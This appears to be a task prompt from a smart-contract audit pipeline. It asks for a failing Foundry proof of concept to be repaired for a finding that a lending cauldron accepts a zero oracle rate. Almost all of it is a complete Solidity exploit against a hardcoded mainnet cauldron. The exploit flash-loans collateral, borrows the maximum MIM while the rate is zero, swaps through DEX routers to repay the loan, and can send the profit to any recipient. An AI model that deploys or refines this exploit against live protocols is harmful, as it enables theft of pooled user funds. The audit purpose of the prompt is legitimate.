You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: Zero oracle rates are accepted and make any borrower with nonzero collateral appear solvent
- claim: Neither `init()` nor `updateExchangeRate()` validates that the oracle returned success or that the returned rate is nonzero before storing or using it. If the cached `exchangeRate` becomes zero, `_isSolvent()` reduces the debt side of the solvency inequality to zero, so any account with positive collateral passes solvency checks, and `liquidate()` also stops treating those borrowers as insolvent.
- impact: During a zero-rate oracle event, users can post dust collateral, borrow out the cauldron's MIM, and remain effectively unliquidatable until a valid price is restored.
- exploit_paths: ["At initialization, `oracle.get()` can return `(false, 0)` or another zero rate and the clone stores `exchangeRate = 0` without reverting.", "Later, a user borrows through `borrow()` or `cook(ACTION_BORROW, ...)`; the post-action solvency check uses the zero cached rate, so the position is accepted despite being deeply undercollateralized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface ICauldronV4Like {
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function COLLATERIZATION_RATE() external view returns (uint256);
    function addCollateral(address to, bool skim, uint256 share) external;
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant COLLATERIZATION_RATE_PRECISION = 1e5;
    uint256 internal constant EXCHANGE_RATE_PRECISION = 1e18;

    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_UPDATE_EXCHANGE_RATE = 11;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error FlashLoanCallerMismatch(address expected, address actual);
    error FlashLoanSenderMismatch(address expected, address actual);
    error FlashLoanTokenMismatch(address expected, address actual);
    error ProbeBorrowSucceeded(uint256 part, uint256 share);

    address public collateralToken;
    address public underlyingToken;
    address public curveLpToken;
    address public convexDepositToken;

    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public exchangeRateBefore;
    uint256 public exchangeRateAfterBorrow;
    uint256 public collateralShareAdded;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    uint256 public mimProfitAmount;
    uint256 public lastBorrowAmount;
    uint256 public lastBorrowPart;
    uint256 public lastProfitAmount;

    bool public zeroRateObserved;
    bool public exploitCurrentlyFeasible;
    bool public positionReportedSolvent;
    bool public requireZeroFee;
    bool public feeBuybackUsed;
    bool public hypothesisValidated;

    address public lastProfitToken;
    bytes public lastAttemptRevertData;

    constructor() {
        lastProfitToken = MIM;
    }

    receive() external payable {}

    function execute() external returns (uint256 profitAmount) {
        return _execute();
    }

    function run() external returns (uint256 profitAmount) {
        return _execute();
    }

    function exploit() external returns (uint256 profitAmount) {
        return _execute();
    }

    function executeTo(address recipient) external returns (uint256 profitAmount) {
        profitAmount = _execute();
        if (profitAmount != 0 && recipient != address(0) && recipient != address(this)) {
            _safeTransfer(MIM, recipient, profitAmount);
            lastProfitAmount = 0;
        }
    }

    function executeWithAmount(uint256 amount, bool zeroFeeOnly) external returns (uint256 profitAmount) {
        _prepare();
        return _executeWithAmount(amount, zeroFeeOnly);
    }

    function previewProfitToken() external pure returns (address) {
        return MIM;
    }

    function previewBorrowAmount() external view returns (uint256 amount) {
        return _maxBorrowableAmountByCaps();
    }

    function sweep(address token, address to) external returns (uint256 amount) {
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount != 0) {
            _safeTransfer(token, to, amount);
        }
        if (token == lastProfitToken) {
            lastProfitAmount = 0;
        }
    }

    function probeBorrow(uint256 amount) external {
        if (msg.sender != address(this)) revert ConcretePreconditionFailed("SELF_CALL_ONLY");
        (uint256 part, uint256 share) = _borrowViaCook(amount);
        revert ProbeBorrowSucceeded(part, share);
    }

    function _execute() internal returns (uint256 profitAmount) {
        _prepare();
        if (!exploitCurrentlyFeasible) return 0;

        address bento = TARGET.bentoBox();
        uint256 idle = IERC20Like(collateralToken).balanceOf(bento);
        if (idle == 0) revert ConcretePreconditionFailed("NO_COLLATERAL_FLASH_LIQUIDITY");

        uint256[12] memory smallCandidates = [
            uint256(1),
            10,
            100,
            1_000,
            10_000,
            100_000,
            1_000_000,
            10_000_000,
            100_000_000,
            1_000_000_000,
            1_000_000_000_000,
            1_000_000_000_000_000
        ];

        for (uint256 i = 0; i < smallCandidates.length; i++) {
            uint256 amount = smallCandidates[i];
            if (amount == 0 || amount > idle) continue;
            if (IBentoBoxLike(bento).toShare(collateralToken, amount, false) == 0) continue;
            try this.executeWithAmount(amount, true) returns (uint256 okProfit) {
                if (okProfit != 0) return okProfit;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        uint256[8] memory divisors = [uint256(10_000), 1_000, 100, 10, 4, 2, 1, 0];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 amount = divisors[i] == 0 ? idle : idle / divisors[i];
            if (amount == 0 || amount > idle) continue;
            if (IBentoBoxLike(bento).toShare(collateralToken, amount, false) == 0) continue;
            try this.executeWithAmount(amount, false) returns (uint256 okProfit) {
                if (okProfit != 0) return okProfit;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        return 0;
    }

    function _prepare() internal {
        collateralToken = TARGET.collateral();
        if (collateralToken == address(0)) revert ConcretePreconditionFailed("NO_COLLATERAL");

        curveLpToken = _readAddress(collateralToken, abi.encodeWithSignature("curveToken()"));
        convexDepositToken = _readAddress(collateralToken, abi.encodeWithSignature("convexToken()"));
        underlyingToken = curveLpToken != address(0) ? curveLpToken : _probeUnderlying(collateralToken);

        zeroRateObserved = false;
        exploitCurrentlyFeasible = true;
        positionReportedSolvent = false;
        hypothesisValidated = false;
        lastProfitToken = MIM;

        exchangeRateBefore = TARGET.exchangeRate();
        if (exchangeRateBefore == 0) {
            zeroRateObserved = true;
            return;
        }

        _observeOracleZeroPath();

        try TARGET.updateExchangeRate() returns (bool success, uint256 rate) {
            exchangeRateBefore = rate;
            if (!success || rate == 0) {
                zeroRateObserved = true;
            }
        } catch {}
    }

    function _observeOracleZeroPath() internal {
        address oracle = TARGET.oracle();
        if (oracle == address(0)) return;

        try IOracleLike(oracle).get(TARGET.oracleData()) returns (bool success, uint256 rate) {
            if (!success && rate == 0) {
                zeroRateObserved = true;
            }
            if (rate == 0) {
                exchangeRateBefore = 0;
                zeroRateObserved = true;
            }
        } catch {}
    }

    function _executeWithAmount(uint256 amount, bool zeroFeeOnly) internal returns (uint256 profitAmount) {
        flashAmount = amount;
        flashFee = 0;
        collateralShareAdded = 0;
        borrowedAmount = 0;
        borrowedPart = 0;
        borrowedShare = 0;
        mimProfitAmount = 0;
        exchangeRateAfterBorrow = 0;
        positionReportedSolvent = false;
        requireZeroFee = zeroFeeOnly;
        feeBuybackUsed = false;
        lastBorrowAmount = 0;
        lastBorrowPart = 0;
        lastProfitAmount = 0;
        lastProfitToken = MIM;

        if (!exploitCurrentlyFeasible) return 0;

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, amount, bytes(""));

        if (borrowedAmount == 0 || borrowedPart == 0 || borrowedShare == 0) {
            revert ConcretePreconditionFailed("BORROW_NOT_RECORDED");
        }
        if (!positionReportedSolvent) revert ConcretePreconditionFailed("POSITION_NOT_REPORTED_SOLVENT");
        if (mimProfitAmount == 0) return 0;

        lastBorrowAmount = borrowedAmount;
        lastBorrowPart = borrowedPart;
        lastProfitAmount = mimProfitAmount;
        hypothesisValidated = zeroRateObserved && positionReportedSolvent;
        return mimProfitAmount;
    }

    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        address bento = TARGET.bentoBox();
        if (msg.sender != bento) revert FlashLoanCallerMismatch(bento, msg.sender);
        if (sender != address(this)) revert FlashLoanSenderMismatch(address(this), sender);
        if (address(token) != collateralToken) revert FlashLoanTokenMismatch(collateralToken, address(token));
        if (requireZeroFee && fee != 0) revert ConcretePreconditionFailed("NON_ZERO_FLASH_FEE");

        flashAmount = amount;
        flashFee = fee;

        _forceApprove(collateralToken, bento, amount);
        (, collateralShareAdded) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET_CAULDRON, amount, 0);
        if (collateralShareAdded == 0) revert ConcretePreconditionFailed("ZERO_COLLATERAL_SHARE");

        TARGET.addCollateral(address(this), true, collateralShareAdded);
        if (TARGET.userCollateralShare(address(this)) == 0) revert ConcretePreconditionFailed("ADD_COLLATERAL_FAILED");

        borrowedAmount = _determineBorrowAmount();
        if (borrowedAmount == 0) revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");

        (borrowedPart, borrowedShare) = _borrowViaCook(borrowedAmount);
        if (TARGET.userBorrowPart(address(this)) == 0) revert ConcretePreconditionFailed("USER_DEBT_MISSING");

        exchangeRateAfterBorrow = TARGET.exchangeRate();
        if (exchangeRateAfterBorrow == 0) {
            zeroRateObserved = true;
        }

        positionReportedSolvent = TARGET.isSolvent(address(this));
        if (!positionReportedSolvent) revert ConcretePreconditionFailed("POSITION_NOT_REPORTED_SOLVENT");

        _withdrawAllTokenFromBento(MIM);

        uint256 collateralNeededForRepay = amount + fee;
        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance < collateralNeededForRepay) {
            _buyBackCollateralIfNeeded(collateralNeededForRepay - collateralBalance);
            feeBuybackUsed = true;
        }

        uint256 finalCollateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (finalCollateralBalance < collateralNeededForRepay) {
            revert ConcretePreconditionFailed("INSUFFICIENT_COLLATERAL_FOR_FLASH_REPAY");
        }

        _safeTransfer(collateralToken, bento, collateralNeededForRepay);

        mimProfitAmount = IERC20Like(MIM).balanceOf(address(this));
    }

    function _determineBorrowAmount() internal returns (uint256 amount) {
        uint256 capLimited = _maxBorrowableAmountByCaps();
        if (capLimited == 0) return 0;

        if (zeroRateObserved) {
            amount = capLimited;
            if (amount > 1) amount -= 1;
            return amount;
        }

        uint256 collateralLimited = _maxBorrowFromCollateral();
        if (collateralLimited == 0) return 0;

        amount = _min(capLimited, collateralLimited);
        if (amount == 0) return 0;

        uint256 buffered = (amount * 9_900) / BPS;
        if (buffered != 0) {
            amount = buffered;
        }

        if (_probeBorrowSucceeds(amount)) {
            return amount;
        }

        uint256 high = amount;
        uint256 low = 0;
        for (uint256 i = 0; i < 24 && high > low + 1; i++) {
            uint256 mid = (low + high) >> 1;
            if (_probeBorrowSucceeds(mid)) {
                low = mid;
            } else {
                high = mid;
            }
        }

        if (low == 0) return 0;
        return low;
    }

    function _borrowViaCook(uint256 amount) internal returns (uint256 part, uint256 share) {
        bool useUpdateAction = TARGET.exchangeRate() != 0;
        uint256 actionCount = useUpdateAction ? 2 : 1;

        uint8[] memory actions = new uint8[](actionCount);
        uint256[] memory values = new uint256[](actionCount);
        bytes[] memory datas = new bytes[](actionCount);

        uint256 borrowIndex;
        if (useUpdateAction) {
            actions[0] = ACTION_UPDATE_EXCHANGE_RATE;
            values[0] = 0;
            datas[0] = abi.encode(false, 0, 0);
            borrowIndex = 1;
        }

        actions[borrowIndex] = ACTION_BORROW;
        values[borrowIndex] = 0;
        datas[borrowIndex] = abi.encode(int256(amount), address(this));

        (part, share) = TARGET.cook(actions, values, datas);
        if (part == 0 || share == 0) {
            part = TARGET.userBorrowPart(address(this));
            share = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        }
    }

    function _probeBorrowSucceeds(uint256 amount) internal returns (bool ok) {
        if (amount == 0) return false;
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(this.probeBorrow.selector, amount));
        if (success) return false;
        if (data.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }
        return selector == ProbeBorrowSucceeded.selector;
    }

    function _maxBorrowableAmountByCaps() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 availableAmount = bento.toAmount(MIM, bento.balanceOf(MIM, TARGET_CAULDRON), false);
        if (availableAmount == 0) return 0;

        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = TARGET.totalBorrow();
        uint256 currentPart = TARGET.userBorrowPart(address(this));
        uint256 openingFee = TARGET.BORROW_OPENING_FEE();

        uint256 remainingTotalElastic = totalCap > totalElastic ? uint256(totalCap) - uint256(totalElastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotalElastic == 0 || remainingPart == 0) return 0;

        uint256 fromTotalCap = (remainingTotalElastic * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        uint256 maxDebtFromPart = (totalElastic == 0 || totalBase == 0)
            ? remainingPart
            : (remainingPart * uint256(totalElastic)) / uint256(totalBase);
        uint256 fromPartCap = (maxDebtFromPart * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        amount = _min(availableAmount, _min(fromTotalCap, fromPartCap));
    }

    function _maxBorrowFromCollateral() internal view returns (uint256 amount) {
        uint256 rate = TARGET.exchangeRate();
        if (rate == 0) return _maxBorrowableAmountByCaps();

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 collateralAmount = bento.toAmount(collateralToken, TARGET.userCollateralShare(address(this)), false);
        if (collateralAmount == 0) return 0;

        uint256 collateralizationRate = TARGET.COLLATERIZATION_RATE();
        amount = (collateralAmount * collateralizationRate * EXCHANGE_RATE_PRECISION)
            / COLLATERIZATION_RATE_PRECISION
            / rate;

        uint256 openingFee = TARGET.BORROW_OPENING_FEE();
        amount = (amount * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
    }

    function _withdrawAllTokenFromBento(address token) internal {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 share = bento.balanceOf(token, address(this));
        if (share != 0) {
            bento.withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _buyBackCollateralIfNeeded(uint256 missingCollateral) internal {
        if (missingCollateral == 0) return;
        if (_tryAcquireExactOutput(MIM, collateralToken, missingCollateral)) return;

        address localUnderlying = underlyingToken;
        if (localUnderlying != address(0) && localUnderlying != collateralToken) {
            uint256 underlyingNeeded = _underlyingForCollateralAmount(missingCollateral);
            if (_tryAcquireExactOutput(MIM, localUnderlying, underlyingNeeded) && _wrapAllUnderlying()) {
                return;
            }
        }

        revert ConcretePreconditionFailed("FEE_BUYBACK_ROUTE_NOT_FOUND");
    }

    function _tryAcquireExactOutput(address tokenIn, address tokenOut, uint256 amountOut) internal returns (bool ok) {
        if (tokenIn == address(0) || tokenOut == address(0) || amountOut == 0) return false;
        uint256 balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (balanceIn == 0) return false;

        address[] memory direct = _directPath(tokenIn, tokenOut);
        if (_tryExactOutputSwap(SUSHI_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWeth = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(SUSHI_ROUTER, viaWeth, amountOut, balanceIn)) return true;
        }

        balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWethUni = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, viaWethUni, amountOut, balanceIn)) return true;
        }

        return false;
    }

    function _tryExactOutputSwap(address router, address[] memory path, uint256 amountOut, uint256 amountInMax)
        internal
        returns (bool ok)
    {
        if (amountInMax == 0 || amountOut == 0) return false;
        if (path.length < 2 || path[0] == address(0) || path[path.length - 1] == address(0)) return false;
        if (IERC20Like(path[0]).balanceOf(address(this)) < amountInMax) return false;
        if (!_isContract(router) || !_routeExists(router, path)) return false;

        _forceApprove(path[0], router, amountInMax);
        try IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut, amountInMax, path, address(this), block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _wrapAllUnderlying() internal returns (bool) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return false;

        address intermediate = underlyingToken;
        uint256 amount = IERC20Like(intermediate).balanceOf(address(this));
        if (amount == 0) return false;

        if (
            curveLpToken != address(0)
                && convexDepositToken != address(0)
                && intermediate == curveLpToken
                && collateralToken != curveLpToken
        ) {
            if (!_wrapTokenInto(convexDepositToken, intermediate, amount)) return false;
            intermediate = convexDepositToken;
            amount = IERC20Like(intermediate).balanceOf(address(this));
            if (amount == 0) return false;
            if (collateralToken == convexDepositToken) return true;
        }

        return _wrapTokenInto(collateralToken, intermediate, amount);
    }

    function _wrapTokenInto(address wrapper, address tokenIn, uint256 amount) internal returns (bool) {
        if (wrapper == address(0) || tokenIn == address(0) || amount == 0) return false;
        _forceApprove(tokenIn, wrapper, amount);
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("enter(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("stake(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("wrap(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("mint(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256,address)", amount, address(this)))) {
            return true;
        }
        return false;
    }

    function _underlyingForCollateralAmount(uint256 collateralAmount) internal view returns (uint256 underlyingAmount) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return collateralAmount;
        if (underlyingToken == curveLpToken && convexDepositToken != address(0)) return collateralAmount;

        uint256 totalShares = IERC20Like(collateralToken).totalSupply();
        uint256 backing = IERC20Like(underlyingToken).balanceOf(collateralToken);
        if (totalShares == 0 || backing == 0) return collateralAmount;

        underlyingAmount = (collateralAmount * backing) / totalShares;
        if ((collateralAmount * backing) % totalShares != 0) underlyingAmount += 1;
    }

    function _probeUnderlying(address token) internal view returns (address underlying) {
        underlying = _readAddress(token, abi.encodeWithSignature("curveToken()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("token()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("asset()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("lp_token()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("want()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("stakingToken()"));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory result) = target.staticcall(data);
        if (ok && result.length >= 32) {
            value = abi.decode(result, (address));
        }
    }

    function _routeExists(address router, address[] memory path) internal view returns (bool) {
        if (path.length < 2) return false;

        address factory;
        try IUniswapV2RouterLike(router).factory() returns (address resolvedFactory) {
            factory = resolvedFactory;
        } catch {
            return false;
        }

        if (!_isContract(factory)) return false;
        for (uint256 i = 0; i + 1 < path.length; i++) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callOptionalNoReturn(address target, bytes memory data) internal returns (bool) {
        (bool ok,) = target.call(data);
        return ok;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _wethPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: oracle.get(), (false, 0), exchangerate = 0, oracle.get, cook(action_borrow, ...)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. output ONLY Solidity code
